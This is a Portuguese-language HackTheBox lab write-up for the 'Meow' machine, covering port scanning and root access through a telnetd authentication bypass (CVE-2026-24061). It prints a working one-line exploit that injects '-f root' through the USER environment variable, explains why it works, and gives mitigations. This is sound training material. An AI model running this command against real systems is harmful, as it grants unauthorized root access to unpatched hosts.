<h1 align="center"> Meow — Write-up </h1>

<p align="center"><a href="https://app.hackthebox.com/public/users/3757032"><img src="https://custom-icon-badges.demolab.com/badge/HackTheBox-111927?style=for-the-badge&logo=hackthebox&logoColor=9FEAF9" alt="HackTheBox" /></a></p>

</br>

## Informações Gerais

| Campo | Detalhe |
|---|---|
| Plataforma | HackTheBox |
| Dificuldade | Fácil |
| Sistema Operacional | Linux |
| IP do alvo | 10.129.218.3 |
| Data | 21/07/2026 |
| Técnicas envolvidas | Enumeração e exploração de um serviço telnet vulnerável. |

</br>

## Resumo Executivo

> Exploração de um serviço Telnet vulnerável pela CVE-2026-24061, permitindo acesso root ao sistema sem a necessidade de autenticação com senha.

</br>

## 1. Reconhecimento

### 1.1 Varredura de portas

```bash
nmap 10.129.218.3
```

**Resultado:**
```
PORT   STATE SERVICE
23/tcp open  telnet
```

**Análise:** Telnet aberto chamou a atenção, pois é um protocolo antigo,
sem criptografia, e historicamente associado a credenciais fracas
ou padrão.

</br>

## 2. Enumeração

### 2.1 Serviço
Não utilizei nenhum serviço de enumeração.

</br>

## 3. Exploração

### 3.1 Vulnerabilidade identificada

Uma falha crítica de bypass de autenticação (CVE-2026-24061) permite acesso root não autenticado no GNU inetutils telnetd.

### 3.2 Prova de conceito / Exploração

```bash
USER="-f root" telnet -a 10.129.218.3
```

**Explicação:** Durante a negociação de opções Telnet via RFC NEW-ENVIRON, o servidor aceita a variável de ambiente `USER` de um cliente remoto e a repassa diretamente, sem higienização, para o `/bin/login`. Assim, a injeção de `USER=-f root` faz com que o programa de login interprete `-f` como um argumento de linha de comando que instrui o programa a ignorar a autenticação por senha, permitindo que o usuário remoto acesse diretamente um shell *root* sem autenticação.

### 3.3 Acesso obtido

```
Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
```

</br>

## 4. Escalação de Privilégio

### 4.1 Enumeração local
Não realizei uma escalação de privilégio.

</br>

## 5. Flags

| Flag | Localização |
|---|---|
| flag.txt | `/root/flag.txt` |

</br>

## 6. Lições Aprendidas

- Travei quando acessei o serviço Telnet via terminal, a forma como ele é usado é diferente, fiquei em dúvida sobre como o acessava com o user `root`, percebi que era só digitar o nome do user, literalmente, cru, para poder acessar o sistema.
- De agora em diante vou pesquisar pela documentação oficial da ferramenta, de antemão, para entender melhor como usá-la e obter acesso ao necessário.
- Aprendi sobre como usar o serviço Telnet e em como acessá-lo sem precisar de autenticação (por conta da CVE).
- Esse tipo de má configuração pode ser encontrada em ambientes corporativos antigos, inseguros (por não utilizar o protocolo SSH, que é criptografado) e que não são atualizados com frequência.

</br>

## 7. Mitigação

| Vulnerabilidade | Risco | Recomendação |
|---|---|---|
| Root via Telnet (CVE-2026-24061) | Crítico | Interrompa e desabilite completamente o serviço Telnet, uma vez que esse protocolo de texto simples é inseguro por definição, utilize um serviço seguro e criptografado como o SSH. Atualize os pacotes GNU InetUtils para versões posteriores à 2.7, nas quais a falha de injeção de argumentos foi corrigida. |

</br>

## Referências

- https://nvd.nist.gov/vuln/detail/cve-2026-24061
- https://learn.microsoft.com/pt-br/windows-server/administration/windows-commands/telnet
- https://www.txone.com/resources/blog/cve-2026-24061-gnu-inetutils-telnet-exploitation/
